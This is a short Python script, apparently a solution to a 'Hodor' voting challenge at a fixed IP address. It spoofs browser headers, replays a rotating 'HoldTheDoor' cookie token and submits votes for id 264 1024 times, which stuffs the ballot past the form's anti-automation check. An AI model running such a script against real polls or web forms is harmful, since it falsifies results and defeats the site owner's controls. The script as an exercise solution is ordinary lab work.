import requests
head = {'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)', 'Referer' : 'http://158.69.76.135/level2.php'}
r = requests.get('http://158.69.76.135/level2.php')
c = r.cookies
for key, value in c.items():
    cookie = value

newcook = {'HoldTheDoor' : cookie}
payload = {'id' : '264', 'holdthedoor' : 'Submit', 'key' : '{}'.format(cookie)}
for i in range(1024):
    r = requests.post('http://158.69.76.135/level2.php', data=payload, cookies=newcook, headers=head)
    c = r.cookies
    print(i + 1)
    for key, value in c.items():
        cookie = value
    newcook = {'HoldTheDoor' : cookie}
    payload = {'id' : '264', 'holdthedoor' : 'Submit', 'key' : cookie}
